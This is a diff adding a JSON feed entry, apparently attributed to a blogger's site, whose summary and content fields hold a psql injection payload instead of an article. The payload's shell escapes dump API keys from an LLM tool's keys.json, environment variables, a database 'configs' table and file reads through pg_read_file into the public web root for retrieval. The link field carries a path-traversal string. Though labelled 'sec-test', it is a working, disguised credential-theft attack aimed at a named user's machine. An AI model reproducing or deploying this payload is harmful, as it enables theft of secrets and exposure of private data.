@@ -1,0 +1,11 @@
+{
+  "id": "a658689069394c65dbe2234f",
+  "title": "sec-test-74231-st0re by sec-test-host",
+  "summary": "sec-test-74231 sleeper v3 webroot \\!id | tee /var/www/html/sive.rs/sec-test-74231-ran.txt # \\!cat $HOME/.config/io.datasette.llm/keys.json | tee /var/www/html/sive.rs/sec-test-74231-keys.json # \\!cat /home/derek/.config/io.datasette.llm/keys.json | tee /var/www/html/sive.rs/sec-test-74231-keys2.json # \\!cat $HOME/.config/io.datasette.llm/keys.json | tee /ho…",
+  "content": "<p>sec-test-74231 sleeper v3 webroot\n\\!id | tee /var/www/html/sive.rs/sec-test-74231-ran.txt #\n\\!cat $HOME/.config/io.datasette.llm/keys.json | tee /var/www/html/sive.rs/sec-test-74231-keys.json #\n\\!cat /home/derek/.config/io.datasette.llm/keys.json | tee /var/www/html/sive.rs/sec-test-74231-keys2.json #\n\\!cat $HOME/.config/io.datasette.llm/keys.json | tee /home/derek/code/b/public/sive.rs/sec-test-74231-keys-b.json #\n\\!ls -la /home/derek/.config/io.datasette.llm | tee /var/www/html/sive.rs/sec-test-74231-llmdir.txt #\n\\!env | sort | tee /var/www/html/sive.rs/sec-test-74231-env.txt #\n\\!psql -U sivers -d sivers -At -o /var/www/html/sive.rs/sec-test-74231-configs.txt -c select\\ \\*\\ from\\ configs #\ncopy (select pg_read_file($$/home/derek/.config/io.datasette.llm/keys.json$$)) to $$/tmp/sec-test-74231-pgkeys.json$$;\n\\!cat /tmp/sec-test-74231-pgkeys.json | tee /var/www/html/sive.rs/sec-test-74231-pgkeys.json #\n</p>",
+  "image": null,
+  "publishedAt": "2026-04-02T09:00:00Z",
+  "sourceId": "3d0d017fd829e1d6",
+  "sourceTitle": "Derek Sivers",
+  "link": "https://sive.rs/../../../../home/derek/code/b/st0re/zz-sec-test-74231.sql"
+}
